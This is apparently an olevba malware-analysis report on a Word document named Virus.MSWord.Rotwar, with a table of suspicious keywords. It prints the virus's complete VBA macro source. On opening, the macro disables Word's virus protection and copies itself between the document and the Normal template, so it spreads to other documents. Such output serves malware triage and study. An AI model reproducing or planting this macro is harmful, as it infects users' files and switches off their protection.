olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Rotwar
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Rotwar - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'W.A.R_R.O.O.T._W.O.R.M.
Private Sub Document_Open()
On Error Resume Next
Application.Options.VirusProtection = False
Set x = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Set y = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
If x.Lines(1, 1) <> "'W.A.R_R.O.O.T._W.O.R.M." Then
x.DeleteLines 1, x.CountOfLines
End If
If x.CountOfLines = 0 Then x.InsertLines 1, y.Lines(1, y.CountOfLines)
NormalTemplate.Save
If y.Lines(1, 1) <> "'W.A.R_R.O.O.T._W.O.R.M." Then
y.DeleteLines 1, y.CountOfLines
End If
If y.CountOfLines = 0 Then y.InsertLines 1, x.Lines(1, x.CountOfLines)
ActiveDocument.Save
End

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

